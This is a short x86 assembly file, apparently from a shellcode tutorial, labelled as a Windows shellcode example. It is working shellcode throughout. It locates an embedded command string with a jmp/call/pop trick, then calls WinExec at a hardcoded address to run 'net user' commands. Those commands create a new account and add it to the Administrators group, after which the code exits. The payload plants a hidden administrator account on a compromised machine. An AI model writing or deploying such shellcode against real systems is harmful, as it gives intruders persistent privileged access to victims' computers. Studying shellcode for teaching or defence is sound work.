;By Steve Hanna
;shanna@uiuc.edu
;http://www.vividmachines.com/
;Windows Shellcode
;adduser.asm shellcode example
;this shellcode uses adds a user
;to the system then adds that user
; to the administrators group

[Section .text]

global _start

_start:

jmp short GetCommand

CommandReturn:
	pop ebx			;ebx now holds the handle to the string
	xor eax,eax
	push eax 
	xor eax,eax			;for some reason the registers can be very volatile, did this just in case
	mov [ebx + 89],al		;insert the NULL character
	push ebx
	mov ebx,0x77e6fd35
	call ebx			;call WinExec(path,showcode)

	xor eax,eax			;zero the register again, clears winexec retval
	push eax
	mov ebx, 0x77e798fd
	call ebx			;call ExitProcess(0);


GetCommand:
	;the N at the end of the db will be replaced with a null character
	call CommandReturn
	db "cmd.exe /c net user USERNAME PASSWORD /ADD && net localgroup Administrators /ADD USERNAMEN"

